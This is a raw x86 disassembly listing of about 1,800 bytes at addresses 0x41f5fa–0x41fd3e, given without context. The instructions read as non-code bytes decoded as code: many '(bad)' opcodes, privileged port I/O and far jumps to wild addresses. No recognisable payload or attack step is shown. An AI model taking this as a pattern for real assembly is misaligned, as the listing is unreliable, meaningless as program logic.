  41f5fa:	popa   
  41f5fb:	mov    cl,0xa1
  41f5fd:	add    al,0xcd
  41f5ff:	call   FWORD PTR [ebp-0x6d]
  41f602:	push   ss
  41f603:	scas   al,BYTE PTR es:[edi]
  41f604:	loop   0x41f5a6
  41f606:	or     eax,0x3fa96f14
  41f60b:	rcl    BYTE PTR [ecx-0x53d5625],0xad
  41f612:	xchg   ebx,eax
  41f613:	test   al,0x85
  41f615:	pop    es
  41f616:	lods   eax,DWORD PTR ds:[esi]
  41f617:	and    DWORD PTR [ebx],0xb2336279
  41f61d:	cdq    
  41f61e:	ret    
  41f61f:	jno    0x41f5a8
  41f621:	fs ret 0x1305
  41f625:	mov    dh,0xdf
  41f627:	int3   
  41f628:	lods   al,BYTE PTR ds:[esi]
  41f629:	mov    BYTE PTR cs:[edx+0x1a074905],bl
  41f630:	outs   dx,BYTE PTR ds:[esi]
  41f631:	mov    DWORD PTR [ebp+0x1a],ecx
  41f634:	mov    WORD PTR [edi+0x20da63f4],?
  41f63a:	xor    BYTE PTR [edi],bl
  41f63c:	repnz inc edx
  41f63e:	cmp    eax,0xcd6d63a7
  41f643:	adc    eax,0x55874dc9
  41f648:	fstp   QWORD PTR [ebx+0x243325ba]
  41f64e:	xchg   DWORD PTR [edi+eax*2],edx
  41f651:	leave  
  41f652:	add    al,0x9a
  41f654:	test   eax,0xd0716d57
  41f659:	adc    eax,0x26336355
  41f65e:	scas   al,BYTE PTR es:[edi]
  41f65f:	xor    al,0x8f
  41f661:	icebp  
  41f662:	dec    edi
  41f663:	mov    BYTE PTR [ecx-0x1aa1ddfa],bl
  41f669:	inc    ebp
  41f66a:	leave  
  41f66b:	sar    BYTE PTR [eax-0x41],1
  41f66e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f66f:	inc    ebx
  41f670:	xchg   DWORD PTR [edx+0x7f0eca0f],edx
  41f676:	iret   
  41f677:	lds    ebx,FWORD PTR [edx-0x64f9d2e]
  41f67d:	sub    al,0x70
  41f67f:	jecxz  0x41f609
  41f681:	cdq    
  41f682:	nop
  41f683:	xchg   di,ax
  41f685:	sub    dh,BYTE PTR [ebx-0x43f0f49e]
  41f68b:	repnz enter 0x5116,0x91
  41f690:	inc    ebx
  41f691:	mov    cl,0xea
  41f693:	and    ah,dh
  41f695:	inc    esp
  41f696:	cmp    esp,ebx
  41f698:	cmp    al,0xd9
  41f69a:	loope  0x41f61d
  41f69c:	bound  edi,QWORD PTR [ecx+0x15]
  41f69f:	scas   al,BYTE PTR es:[edi]
  41f6a0:	add    ebp,DWORD PTR [ebx-0x57609a6f]
  41f6a6:	in     eax,dx
  41f6a7:	jb     0x41f6ea
  41f6a9:	dec    ecx
  41f6aa:	call   0x602f0dfd
  41f6af:	ins    BYTE PTR es:[edi],dx
  41f6b0:	cmp    al,0x36
  41f6b2:	mov    eax,0xb133b8a4
  41f6b7:	xchg   edx,eax
  41f6b8:	jbe    0x41f6d7
  41f6ba:	jle    0x41f681
  41f6bc:	jno    0x41f649
  41f6be:	out    dx,eax
  41f6bf:	nop
  41f6c0:	aaa    
  41f6c1:	das    
  41f6c2:	xchg   esp,eax
  41f6c3:	ja     0x41f6b1
  41f6c5:	lods   al,BYTE PTR ds:[esi]
  41f6c6:	and    ch,BYTE PTR [ebp+0x7ff77495]
  41f6cc:	loope  0x41f695
  41f6ce:	inc    eax
  41f6cf:	aaa    
  41f6d0:	imul   ebp,DWORD PTR [ecx],0xffffffd4
  41f6d3:	(bad)  
  41f6d4:	jmp    0x41f6b2
  41f6d6:	push   ebx
  41f6d7:	xchg   ebx,eax
  41f6d8:	loope  0x41f6e7
  41f6da:	lods   eax,DWORD PTR ds:[esi]
  41f6db:	clc    
  41f6dc:	add    eax,0x69188027
  41f6e1:	xlat   BYTE PTR ds:[ebx]
  41f6e2:	test   eax,0x48d0df09
  41f6e7:	popf   
  41f6e8:	mov    ah,0xde
  41f6ea:	ins    BYTE PTR es:[edi],dx
  41f6eb:	pop    ds
  41f6ec:	fucomp st(2)
  41f6ee:	pop    es
  41f6ef:	cdq    
  41f6f0:	pop    es
  41f6f1:	mov    ecx,0xfcd4577f
  41f6f6:	stc    
  41f6f7:	ror    esi,0xfb
  41f6fa:	daa    
  41f6fb:	out    0x83,al
  41f6fd:	pop    esi
  41f6fe:	sbb    al,0xca
  41f700:	xchg   edi,eax
  41f701:	and    bl,BYTE PTR [edi+0x120654c3]
  41f707:	jmp    0xaedff32b
  41f70c:	ja     0x41f70a
  41f70e:	dec    esp
  41f70f:	ret    0xc9dc
  41f712:	mov    bl,0x48
  41f714:	or     DWORD PTR [ebp+0x4b565d24],eax
  41f71a:	add    BYTE PTR [ebp-0x5eae0618],bh
  41f720:	xor    al,0xec
  41f722:	and    al,0xa6
  41f724:	sbb    BYTE PTR [ecx-0x5],bh
  41f727:	ja     0x41f752
  41f729:	int3   
  41f72a:	outs   dx,BYTE PTR ds:[esi]
  41f72b:	sub    DWORD PTR [ebx-0xb8108bd],ebp
  41f731:	inc    esi
  41f732:	aas    
  41f733:	jl     0x41f6df
  41f735:	jno    0x41f6e7
  41f737:	inc    edi
  41f738:	xchg   esp,eax
  41f739:	sub    al,dh
  41f73b:	push   esp
  41f73c:	or     DWORD PTR [esi],0x38
  41f73f:	sbb    DWORD PTR fs:[edx-0xc],edx
  41f743:	add    BYTE PTR [eax+0x60],dh
  41f746:	mov    al,ds:0x9044b512
  41f74b:	mov    dh,0xf4
  41f74d:	hlt    
  41f74e:	sub    ah,BYTE PTR [ebx+0x1fdb1f65]
  41f754:	jmp    0x8063:0x75729d4f
  41f75b:	xor    BYTE PTR [edx],bl
  41f75d:	pop    ebp
  41f75e:	test   DWORD PTR [esi-0x51],ebp
  41f761:	repnz pop DWORD PTR [edx]
  41f764:	nop
  41f765:	imul   esi,ebx,0x16dac918
  41f76b:	cmc    
  41f76c:	xchg   ecx,eax
  41f76d:	add    BYTE PTR ds:0xb202ce8c,ch
  41f773:	mov    edi,0xae219ed4
  41f778:	xor    bh,BYTE PTR [ebp-0x42]
  41f77b:	cmp    bl,ch
  41f77d:	test   al,0x33
  41f77f:	dec    esp
  41f780:	jle    0x41f707
  41f782:	aaa    
  41f783:	fs ret 0x4ab8
  41f787:	mov    dl,0xff
  41f789:	sub    eax,0x9906f2c4
  41f78e:	mov    ch,0x91
  41f790:	jle    0x41f7a7
  41f792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f793:	or     ecx,DWORD PTR [edi-0x2e]
  41f796:	dec    esi
  41f797:	sbb    bl,bh
  41f799:	shl    DWORD PTR ds:0x89912ad8,cl
  41f79f:	add    BYTE PTR [ebx],bl
  41f7a1:	lds    ebx,FWORD PTR [ebp-0x6d]
  41f7a4:	jbe    0x41f74f
  41f7a6:	xchg   ebp,eax
  41f7a7:	mov    cl,0x65
  41f7a9:	inc    DWORD PTR [edx+ecx*1-0x30c4945c]
  41f7b0:	adc    al,0xc1
  41f7b2:	xor    ecx,DWORD PTR [ebx+0x5d7c4110]
  41f7b8:	pop    ebx
  41f7b9:	mov    BYTE PTR [ebx],ch
  41f7bb:	pop    ss
  41f7bc:	add    eax,0x8f3ec26
  41f7c1:	sub    ebx,DWORD PTR [edx*4-0x45304012]
  41f7c8:	stos   BYTE PTR es:[edi],al
  41f7c9:	add    BYTE PTR [ecx],al
  41f7cb:	push   edx
  41f7cc:	fwait
  41f7cd:	stos   DWORD PTR es:[edi],eax
  41f7ce:	mov    edi,0x5743c528
  41f7d3:	leave  
  41f7d4:	sub    eax,0x394ac49
  41f7d9:	cld    
  41f7da:	add    DWORD PTR [eax+0x513b37b7],eax
  41f7e0:	jb     0x41f799
  41f7e2:	orps   xmm6,xmm6
  41f7e5:	loope  0x41f7b3
  41f7e7:	daa    
  41f7e8:	into   
  41f7e9:	push   esp
  41f7ea:	mov    eax,0xac361e05
  41f7ef:	test   BYTE PTR [eax-0x18],cl
  41f7f2:	stc    
  41f7f3:	fadd   QWORD PTR [edx]
  41f7f5:	ins    DWORD PTR es:[edi],dx
  41f7f6:	mov    eax,ds:0xbb27cdbf
  41f7fb:	mov    ch,0xdf
  41f7fd:	leave  
  41f7fe:	sbb    DWORD PTR [edi+edi*8+0x559692a5],0xc8714c65
  41f809:	and    BYTE PTR [ecx],dl
  41f80b:	enter  0xab98,0xf7
  41f80f:	xchg   DWORD PTR [eax+0x4a],ebp
  41f812:	jns    0x41f861
  41f814:	outs   dx,BYTE PTR ds:[esi]
  41f815:	lock mov cl,0xe5
  41f818:	cld    
  41f819:	ror    cl,1
  41f81b:	sbb    bh,BYTE PTR ds:0xf687f916
  41f821:	xchg   esi,eax
  41f822:	and    bl,BYTE PTR [ecx+0x5d]
  41f825:	sub    eax,0x7765e029
  41f82a:	mov    ds:0x2ea06c3c,al
  41f82f:	xor    eax,0xde2641a9
  41f834:	call   FWORD PTR [ebx]
  41f836:	xchg   esi,eax
  41f837:	adc    bh,BYTE PTR [ecx+esi*4+0x7f0e0cba]
  41f83e:	add    edx,DWORD PTR [esi+0x7e]
  41f841:	aaa    
  41f842:	xor    bh,BYTE PTR [edx-0x1c]
  41f845:	test   dl,al
  41f847:	(bad)  
  41f849:	xchg   ecx,eax
  41f84a:	mov    edx,0x4f91ee93
  41f84f:	cmp    ebp,DWORD PTR [ecx-0x76e14999]
  41f855:	jbe    0x41f8a4
  41f857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f858:	mov    dl,0xd6
  41f85a:	test   BYTE PTR [esi+0x73701c52],ch
  41f860:	retf   
  41f861:	in     eax,0x35
  41f863:	outs   dx,BYTE PTR ds:[esi]
  41f864:	mov    dh,0xd7
  41f866:	bound  esp,QWORD PTR [esi-0x5c]
  41f869:	cld    
  41f86a:	inc    ebx
  41f86b:	ins    DWORD PTR es:[edi],dx
  41f86c:	dec    eax
  41f86d:	into   
  41f86e:	and    esi,edx
  41f870:	dec    ecx
  41f871:	dec    edx
  41f872:	ds sbb eax,0x4dc18903
  41f878:	cmc    
  41f879:	neg    DWORD PTR [edi]
  41f87b:	pop    esi
  41f87c:	sbb    al,0xe3
  41f87e:	loopne 0x41f871
  41f880:	jp     0x41f8d5
  41f882:	inc    esp
  41f883:	pop    edx
  41f884:	xor    al,0x14
  41f886:	push   eax
  41f887:	ja     0x41f844
  41f889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f88a:	iret   
  41f88b:	iret   
  41f88c:	cs addr16 push eax
  41f88f:	cmp    esp,ebp
  41f891:	push   esp
  41f892:	daa    
  41f893:	push   0xc40f2753
  41f898:	xchg   edx,eax
  41f899:	sahf   
  41f89a:	je     0x41f84d
  41f89c:	stos   DWORD PTR es:[edi],eax
  41f89d:	dec    ebx
  41f89e:	call   0x872a3ff6
  41f8a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8a4:	and    al,0xce
  41f8a6:	mov    BYTE PTR [ebx+0x5a9ab2e],dh
  41f8ac:	cdq    
  41f8ad:	out    dx,eax
  41f8ae:	add    BYTE PTR [edi+0x4f],dl
  41f8b1:	cld    
  41f8b2:	xlat   BYTE PTR ds:[ebx]
  41f8b3:	test   ebx,eax
  41f8b5:	cmp    DWORD PTR [edi],edi
  41f8b7:	sahf   
  41f8b8:	gs ret 0xbca7
  41f8bc:	out    0x19,eax
  41f8be:	sub    cl,BYTE PTR ss:[ebp+0x1e]
  41f8c2:	mov    ecx,0xd33f08a5
  41f8c7:	mov    esi,0xb6c29416
  41f8cc:	sbb    BYTE PTR [ebp-0x4932ef6f],al
  41f8d2:	scas   eax,DWORD PTR es:[edi]
  41f8d3:	push   esp
  41f8d4:	or     al,cl
  41f8d6:	cs cwde 
  41f8d8:	fbld   TBYTE PTR [esi-0x76]
  41f8db:	mov    ds:0x30accb9e,al
  41f8e0:	pop    ecx
  41f8e1:	jmp    0x41f93d
  41f8e3:	out    dx,eax
  41f8e4:	pop    edi
  41f8e5:	inc    edi
  41f8e6:	mov    edx,0x4c72cdac
  41f8eb:	sti    
  41f8ec:	mov    cl,0xb
  41f8ee:	popf   
  41f8ef:	ja     0x41f949
  41f8f1:	mov    DWORD PTR [eax+0xc],ecx
  41f8f4:	cmp    al,0x19
  41f8f6:	add    al,0x7c
  41f8f8:	jne    0x41f8dc
  41f8fa:	jl     0x41f92c
  41f8fc:	dec    ecx
  41f8fd:	das    
  41f8fe:	jnp    0x41f8be
  41f900:	lahf   
  41f901:	inc    ecx
  41f902:	xchg   esp,eax
  41f903:	loopne 0x41f94e
  41f905:	jmp    0x43ca5949
  41f90a:	mov    al,ds:0x3e230d89
  41f90f:	pop    ebp
  41f910:	push   esi
  41f911:	mov    ebp,0x14dfdfdb
  41f916:	stos   BYTE PTR es:[edi],al
  41f917:	mov    BYTE PTR [esi-0x17],ah
  41f91a:	inc    ebx
  41f91b:	retf   
  41f91c:	and    cl,dh
  41f91e:	mov    ebx,0x6cbc4f96
  41f923:	push   es
  41f924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f925:	(bad)  
  41f926:	dec    ebp
  41f927:	shl    BYTE PTR [ecx+0xd],0x3d
  41f92b:	pop    eax
  41f92c:	fwait
  41f92d:	mov    ebx,0x2559b9c1
  41f932:	lea    edi,[ecx]
  41f934:	xlat   BYTE PTR ds:[ebx]
  41f935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f936:	fwait
  41f937:	jmp    0xc16355ad
  41f93c:	sbb    ecx,edx
  41f93e:	out    0x60,al
  41f940:	cmc    
  41f941:	xor    DWORD PTR [edx-0x3b],edi
  41f944:	fucomi st,st(7)
  41f946:	dec    edi
  41f947:	inc    esi
  41f948:	inc    eax
  41f949:	add    ebx,DWORD PTR [ecx-0x16]
  41f94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f94d:	push   eax
  41f94e:	pop    es
  41f94f:	test   eax,0xeb9f2508
  41f954:	jmp    0x87b9be67
  41f959:	xor    al,0xdb
  41f95b:	je     0x41f9a5
  41f95d:	rep ins DWORD PTR es:[edi],dx
  41f95f:	push   eax
  41f960:	imul   esp,ebp,0xa5f2f33e
  41f966:	retf   
  41f967:	jnp    0x41f915
  41f969:	popa   
  41f96a:	loopne 0x41f972
  41f96c:	mov    ebp,edi
  41f96e:	adc    DWORD PTR [ecx],edi
  41f970:	call   0x6bbf:0x99163d4c
  41f977:	adc    dh,cl
  41f979:	leave  
  41f97a:	sub    BYTE PTR [ebx-0x2ccf8f97],ch
  41f980:	xor    BYTE PTR [ebp-0x24],bh
  41f983:	cld    
  41f984:	fadd   QWORD PTR [edx]
  41f986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f987:	jae    0x41f963
  41f989:	or     BYTE PTR [ebp-0x5a030732],al
  41f98f:	(bad)  
  41f990:	rol    BYTE PTR [esi],cl
  41f992:	push   ebp
  41f993:	add    al,0xc5
  41f995:	ror    DWORD PTR [eax*8+0x2ebaf4b0],cl
  41f99c:	dec    edi
  41f99d:	xchg   ecx,eax
  41f99e:	out    0x69,eax
  41f9a0:	inc    esi
  41f9a1:	pop    ebx
  41f9a2:	lods   al,BYTE PTR ds:[esi]
  41f9a3:	sub    esi,DWORD PTR [ebp-0x44935052]
  41f9a9:	sar    BYTE PTR [esi],0x80
  41f9ac:	dec    edx
  41f9ad:	pop    ebp
  41f9ae:	addr16 mov dh,0x6e
  41f9b1:	xchg   edi,eax
  41f9b2:	and    ecx,ebp
  41f9b4:	sbb    eax,0x372005d5
  41f9b9:	cwde   
  41f9ba:	mov    ebx,0x9bf5a40b
  41f9bf:	add    bl,BYTE PTR [eax+0x66]
  41f9c2:	mov    ch,BYTE PTR [ecx+0x10491e8a]
  41f9c8:	nop
  41f9c9:	sahf   
  41f9ca:	or     ch,BYTE PTR [eax-0x6fefbb0e]
  41f9d0:	mov    ebx,0xddff2302
  41f9d5:	or     edx,esp
  41f9d7:	mov    cl,0x24
  41f9d9:	mov    bh,0xf7
  41f9db:	in     al,0x49
  41f9dd:	adc    al,0x25
  41f9df:	mov    eax,0xa3da2245
  41f9e4:	stc    
  41f9e5:	and    DWORD PTR [ebp-0x7e],edi
  41f9e8:	test   DWORD PTR [edi+0x6d624eea],edi
  41f9ee:	xchg   ebp,eax
  41f9ef:	jne    0x41f98b
  41f9f1:	ss into 
  41f9f3:	(bad)  [edx+0x5a]
  41f9f6:	or     dl,BYTE PTR [edx+edx*8]
  41f9f9:	push   es
  41f9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9fb:	inc    edi
  41f9fc:	mov    edx,0xf897ff33
  41fa01:	test   DWORD PTR [esi-0x19],eax
  41fa04:	ja     0x41f9e5
  41fa06:	sub    ah,cl
  41fa08:	mov    cl,0x41
  41fa0a:	xchg   edx,eax
  41fa0b:	mov    eax,ds:0x6eb1f756
  41fa10:	jno    0x41f9f4
  41fa12:	(bad)  
  41fa13:	and    BYTE PTR [eax+0x4d],dh
  41fa16:	lahf   
  41fa17:	push   0xacae9dde
  41fa1c:	in     eax,0x78
  41fa1e:	std    
  41fa1f:	push   eax
  41fa20:	mov    ch,0x1b
  41fa22:	(bad)  [eax-0xa]
  41fa25:	sub    DWORD PTR [ecx+0x21],ecx
  41fa28:	jb     0x41fa5a
  41fa2a:	aaa    
  41fa2b:	shr    DWORD PTR [edi-0x25],1
  41fa2e:	mov    ah,0xaa
  41fa30:	popa   
  41fa31:	sti    
  41fa32:	mov    eax,ds:0x7d1e70dc
  41fa37:	jmp    0xb18206bb
  41fa3c:	lahf   
  41fa3d:	lods   eax,DWORD PTR ds:[esi]
  41fa3e:	xchg   esi,eax
  41fa3f:	aas    
  41fa40:	sbb    edx,DWORD PTR [edi]
  41fa42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa43:	ds mov dl,0x24
  41fa46:	cmp    ebx,DWORD PTR [edx+0x16]
  41fa49:	mov    al,0x19
  41fa4b:	mov    cl,0x5d
  41fa4d:	xchg   edx,eax
  41fa4e:	fild   QWORD PTR [edx-0x27]
  41fa51:	pop    ds
  41fa52:	adc    BYTE PTR es:[edi+0x67651f37],ch
  41fa59:	pop    ss
  41fa5a:	mov    ebp,0x2ac99d6e
  41fa5f:	jne    0x41fadc
  41fa61:	into   
  41fa62:	mov    edx,edi
  41fa64:	ret    0x97a1
  41fa67:	int    0x6
  41fa69:	test   BYTE PTR [ebp+0x622f992f],dl
  41fa6f:	lahf   
  41fa70:	sbb    edx,DWORD PTR [ecx-0x1e6797b2]
  41fa76:	sub    esi,DWORD PTR [edi]
  41fa78:	sbb    eax,0xf471bacd
  41fa7d:	jp     0x41fa0a
  41fa7f:	rcr    DWORD PTR [ebx+eiz*1+0x5fbc315c],0x8d
  41fa87:	mov    edi,0xa4b87f
  41fa8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa8d:	push   ebp
  41fa8e:	ja     0x41fa9c
  41fa90:	push   es
  41fa91:	xchg   esi,eax
  41fa92:	mov    eax,0x92f25adc
  41fa97:	sbb    BYTE PTR [ebp+0x49981a72],ah
  41fa9d:	dec    ebx
  41fa9e:	cmp    BYTE PTR [edi-0x4354c3da],bl
  41faa4:	(bad)  
  41faa6:	jae    0x41faad
  41faa8:	cmp    esi,ebx
  41faaa:	rol    DWORD PTR [edi-0x1a],cl
  41faad:	ja     0x41fa6f
  41faaf:	(bad)  
  41fab1:	in     eax,0xc2
  41fab3:	sbb    al,0x47
  41fab5:	mov    al,ds:0x57723443
  41faba:	and    edi,DWORD PTR [esi+eax*4]
  41fabd:	clc    
  41fabe:	js     0x41fad7
  41fac0:	jne    0x41fadd
  41fac2:	jne    0x41faa8
  41fac4:	push   0xffffffbc
  41fac6:	mov    al,0x44
  41fac8:	leave  
  41fac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faca:	dec    esi
  41facb:	xchg   bh,al
  41facd:	xchg   esi,eax
  41face:	cdq    
  41facf:	mov    eax,0x7afdca12
  41fad4:	xchg   DWORD PTR [ebx],esi
  41fad6:	mov    DWORD PTR [esi+0x3bee389c],ebx
  41fadc:	add    DWORD PTR [edi+ebx*8],edx
  41fadf:	push   dx
  41fae2:	addr16 cdq 
  41fae4:	rcl    DWORD PTR [ebp-0x188a06fb],cl
  41faea:	mov    cl,0xb8
  41faec:	out    dx,eax
  41faed:	adc    BYTE PTR [ebx],ah
  41faef:	mov    esp,0xb67622f7
  41faf4:	xchg   esi,eax
  41faf5:	push   0xfffffff0
  41faf7:	xchg   esi,eax
  41faf8:	in     al,0xb
  41fafa:	shl    BYTE PTR [eax-0x14],1
  41fafd:	dec    ebp
  41fafe:	fwait
  41faff:	add    edi,DWORD PTR [eax-0x2e]
  41fb02:	xchg   ecx,eax
  41fb03:	(bad)  
  41fb04:	(bad)  
  41fb05:	cld    
  41fb06:	das    
  41fb07:	(bad)  
  41fb08:	sbb    DWORD PTR [ecx],ebx
  41fb0a:	and    eax,0xe4f8abb6
  41fb0f:	pop    eax
  41fb10:	mov    ds:0xc0f91b40,al
  41fb15:	cmc    
  41fb16:	or     esi,DWORD PTR [ebx]
  41fb18:	into   
  41fb19:	or     ah,dl
  41fb1b:	imul   eax,DWORD PTR [ebp+0x10],0x5ed09292
  41fb22:	sbb    al,0x58
  41fb24:	imul   ecx,DWORD PTR [esi+0x6c],0x33
  41fb28:	pop    ss
  41fb29:	retf   0xb2a3
  41fb2c:	xchg   ebx,eax
  41fb2d:	adc    DWORD PTR [ecx+0x33],edx
  41fb30:	pop    edi
  41fb31:	mov    eax,0x30e5d876
  41fb36:	mov    es,esi
  41fb38:	in     al,dx
  41fb39:	call   0x58ca5140
  41fb3e:	mov    bl,BYTE PTR [esi+0x47]
  41fb41:	lods   al,BYTE PTR ds:[esi]
  41fb42:	mov    cl,0x1f
  41fb44:	stc    
  41fb45:	hlt    
  41fb46:	(bad)  
  41fb47:	pop    ss
  41fb48:	stos   DWORD PTR es:[edi],eax
  41fb49:	call   0x92a43db1
  41fb4e:	lahf   
  41fb4f:	in     eax,dx
  41fb50:	mov    dl,0xdd
  41fb52:	sub    ah,BYTE PTR [ecx+edx*4-0x7e83b400]
  41fb59:	adc    ah,BYTE PTR [ecx-0x48c3339]
  41fb5f:	outs   dx,DWORD PTR ds:[esi]
  41fb60:	sbb    al,0x19
  41fb62:	pop    edi
  41fb63:	fbld   TBYTE PTR [edi-0x2]
  41fb66:	jge    0x41fbd4
  41fb68:	fld    TBYTE PTR [ebx-0x44]
  41fb6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb6c:	mov    ah,0xdf
  41fb6e:	sbb    DWORD PTR [edi-0x3833e0c6],0xd5ff5207
  41fb78:	out    dx,eax
  41fb79:	call   0x13de1541
  41fb7e:	lahf   
  41fb7f:	in     eax,0x5b
  41fb81:	mov    cl,0x3a
  41fb83:	fisttp DWORD PTR [ebp-0x537b89f7]
  41fb89:	mov    ebx,0xe60a1cab
  41fb8e:	push   ecx
  41fb8f:	inc    ebx
  41fb90:	mov    esp,DWORD PTR [eax-0x3a14c1ce]
  41fb96:	push   ebx
  41fb97:	mov    ebp,0xdd307b8b
  41fb9c:	mov    BYTE PTR ds:0x98b2d74b,dh
  41fba2:	add    BYTE PTR [esi-0x18],ah
  41fba5:	retf   
  41fba6:	xor    eax,0x5f26fdbc
  41fbab:	jl     0x16c0e078
  41fbb1:	mov    ebp,0x2218a586
  41fbb6:	and    eax,0x92713707
  41fbbb:	aaa    
  41fbbc:	rol    DWORD PTR [esi+0x15],1
  41fbbf:	lea    edi,[esi-0x2a]
  41fbc2:	mov    bh,0x86
  41fbc4:	data16 outs dx,BYTE PTR ds:[esi]
  41fbc6:	mov    esp,cs
  41fbc8:	(bad)  [ecx-0x24]
  41fbcb:	scas   eax,DWORD PTR es:[edi]
  41fbcc:	arpl   WORD PTR ss:[ebp+eax*8+0x3a4dc790],sp
  41fbd4:	aad    0x30
  41fbd6:	pop    ecx
  41fbd7:	xor    esi,DWORD PTR [ebp+0x5f]
  41fbda:	inc    ebp
  41fbdb:	cwde   
  41fbdc:	rcr    DWORD PTR [ebp-0xc],1
  41fbdf:	pop    ss
  41fbe0:	push   edx
  41fbe1:	retf   
  41fbe2:	push   ss
  41fbe3:	inc    edi
  41fbe4:	push   edx
  41fbe5:	mov    edi,0xa45a10d7
  41fbea:	mov    ecx,0xa6fb5f30
  41fbef:	ss ins BYTE PTR es:[edi],dx
  41fbf1:	call   0x5ceeb113
  41fbf6:	aam    0x50
  41fbf8:	repnz cmp BYTE PTR [bp+di],bl
  41fbfc:	test   al,0xc5
  41fbfe:	bound  ecx,QWORD PTR [esi]
  41fc00:	xchg   ecx,eax
  41fc01:	adc    BYTE PTR [ebx+0x6f],al
  41fc04:	ins    DWORD PTR es:[edi],dx
  41fc05:	jno    0x41fb93
  41fc07:	sub    BYTE PTR ss:[ecx+0x6d3dc722],dl
  41fc0e:	int3   
  41fc0f:	arpl   WORD PTR [eax],si
  41fc11:	mov    dh,0x4a
  41fc13:	mov    ah,0x55
  41fc15:	xor    BYTE PTR [ecx+0x5a],dh
  41fc18:	xchg   BYTE PTR [esi],dh
  41fc1a:	cmp    al,0xda
  41fc1c:	push   0xffffffd6
  41fc1e:	lods   al,BYTE PTR ds:[esi]
  41fc1f:	jmp    0xb5ae:0x3f39a50
  41fc26:	aad    0x84
  41fc28:	xor    DWORD PTR [ecx],ebx
  41fc2a:	mov    dh,BYTE PTR [ebp+0x6e531b25]
  41fc30:	cs rol BYTE PTR ds:[esi+ebp*2],1
  41fc35:	jno    0x41fc4e
  41fc37:	mov    ecx,0x4ef12e7a
  41fc3c:	mov    bl,0x0
  41fc3e:	inc    ebp
  41fc3f:	out    0x64,al
  41fc41:	jp     0x41fbe2
  41fc43:	and    eax,0x885c9c80
  41fc48:	and    DWORD PTR [esi+eiz*1+0x5470f2fd],esp
  41fc4f:	dec    ebx
  41fc50:	in     al,dx
  41fc51:	ja     0x41fbea
  41fc53:	dec    eax
  41fc54:	adc    ebp,DWORD PTR [ecx-0x6b]
  41fc57:	mov    ecx,0x8e24f256
  41fc5c:	dec    ebx
  41fc5d:	in     al,0x2a
  41fc5f:	mov    bh,0x70
  41fc61:	adc    eax,0x1a858c65
  41fc66:	push   0xffffff98
  41fc68:	cmp    eax,0xaa358711
  41fc6d:	add    eax,0xacfa415e
  41fc72:	cmp    DWORD PTR [eax+eiz*4-0x348b5417],edx
  41fc79:	inc    ebx
  41fc7a:	das    
  41fc7b:	imul   esi,DWORD PTR [bp+di-0x5b3b],0x96035718
  41fc84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc85:	mov    cl,0x24
  41fc87:	push   ebx
  41fc88:	mov    ds,WORD PTR [eax+ebp*2]
  41fc8b:	cmp    al,0x29
  41fc8d:	or     BYTE PTR [eax-0x79],al
  41fc90:	push   es
  41fc91:	push   ecx
  41fc92:	iret   
  41fc93:	inc    ebp
  41fc94:	jle    0x41fc1f
  41fc96:	fcom   DWORD PTR [ecx]
  41fc98:	push   es
  41fc99:	data16 data16 xlat BYTE PTR ds:[ebx]
  41fc9c:	popf   
  41fc9d:	dec    ebp
  41fc9e:	push   esp
  41fc9f:	cwde   
  41fca0:	sub    eax,0xae6ec69e
  41fca5:	inc    ecx
  41fca6:	cmp    ebp,edi
  41fca8:	dec    eax
  41fca9:	cmovs  edi,DWORD PTR [eax+0x14762f8]
  41fcb0:	xchg   esp,eax
  41fcb1:	rol    al,0x70
  41fcb4:	mov    bh,0x63
  41fcb6:	fisttp DWORD PTR [esi]
  41fcb8:	jmp    0xec08cf24
  41fcbd:	xchg   ebp,eax
  41fcbe:	arpl   WORD PTR [edx],ax
  41fcc0:	and    al,0x60
  41fcc2:	inc    ecx
  41fcc3:	mov    eax,DWORD PTR [ebx]
  41fcc5:	sbb    eax,0x482d72fa
  41fcca:	and    BYTE PTR [ecx-0x7f5032d7],bl
  41fcd0:	dec    ecx
  41fcd1:	xchg   ebx,eax
  41fcd2:	ins    DWORD PTR es:[edi],dx
  41fcd3:	fwait
  41fcd4:	xchg   DWORD PTR [edx+0x16636a92],ebx
  41fcda:	xlat   BYTE PTR ds:[ebx]
  41fcdb:	test   esp,edx
  41fcdd:	xchg   esi,eax
  41fcde:	push   es
  41fcdf:	rcl    bh,1
  41fce1:	nop
  41fce2:	(bad)  
  41fce3:	mov    al,ds:0x65badf71
  41fce8:	aaa    
  41fce9:	es xor ah,0x73
  41fced:	out    dx,eax
  41fcee:	sub    eax,0x41ecd06a
  41fcf3:	push   cs
  41fcf4:	jmp    0xa108:0x7f18b1d3
  41fcfb:	adc    DWORD PTR [edx],edi
  41fcfd:	mov    ecx,0x2a90bb83
  41fd02:	cmp    ebx,DWORD PTR [eax+0x3dfe5c51]
  41fd08:	ss in  al,0x4f
  41fd0b:	aas    
  41fd0c:	mov    ebx,0x814c38bf
  41fd11:	test   DWORD PTR [eax-0x6fec094e],edx
  41fd17:	mov    dh,0x58
  41fd19:	fs mov ebx,0x934f5f5e
  41fd1f:	and    BYTE PTR [edx],dl
  41fd21:	cmc    
  41fd22:	je     0x41fcbd
  41fd24:	xchg   ebp,eax
  41fd25:	inc    ecx
  41fd26:	jle    0x41fd4e
  41fd28:	and    DWORD PTR [eax+0xe230302],ecx
  41fd2e:	ins    DWORD PTR es:[edi],dx
  41fd2f:	and    BYTE PTR [edi],ah
  41fd31:	loope  0x41fd0e
  41fd33:	(bad)  
  41fd34:	pop    edx
  41fd35:	mov    eax,0x75136fe8
  41fd3a:	mov    dh,0x3f
  41fd3c:	ins    DWORD PTR es:[edi],dx
  41fd3d:	push   ebp
  41fd3e:	adc    BYTE PTR [edi-0xc],cl
